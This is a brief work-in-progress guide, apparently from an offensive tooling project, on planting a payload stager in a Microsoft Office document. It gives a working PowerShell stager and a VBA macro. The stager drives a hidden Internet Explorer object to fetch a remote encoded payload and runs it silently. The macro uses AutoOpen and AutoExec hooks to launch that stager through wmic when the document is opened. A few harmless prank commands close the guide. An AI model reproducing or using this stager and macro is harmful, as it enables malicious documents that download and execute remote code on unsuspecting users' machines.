# NOTE: WORK IN PROGRESS

### Embed Payload Stager into a Microsoft Document

* Use the following powershell stager to run the payload (replace `<SRV>` with the URL of the google web server):

```
$i=new-object -com internetexplorer.application;
$i.visible=$false;
$i.silent=$true;
$i.navigate2('<SRV>',14,0,$null,$null);
while($i.busy -or ($i.readystate -ne 4)){sleep -seconds 1};
$p=$i.document.lastchild.innertext;
$i.quit();
powershell.exe -v 2 -noE -NonI -nOpR -eNc $p;
```

* Use the same compression script for `client.ps1` for this payload to get the base64 encoded stager command
* Here is an example Microsoft VBS macro used to call the previously mentioned powershell stager:

```
Private Sub run()
  Dim cmd As String
  cmd = "wmic process call create 'powershell.exe -nOpR -nonI -eNc <stager>'"
  Set sh = CreateObject("WScript.Shell")
  res = sh.run(cmd,0,True)
End Sub
Sub AutoOpen()
  run
End Sub
Sub AutoExec()
  run
End Sub
Sub Auto_Open()
  run
End Sub
Sub Auto_Exec()
  run
End Sub
```

* Fun test commands:
  * `(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom')`
  * `$e=new-object -com internetexplorer.application; $e.visible=$true; $e.navigate('https://www.youtube.com/watch?v=dQw4w9WgXcQ');`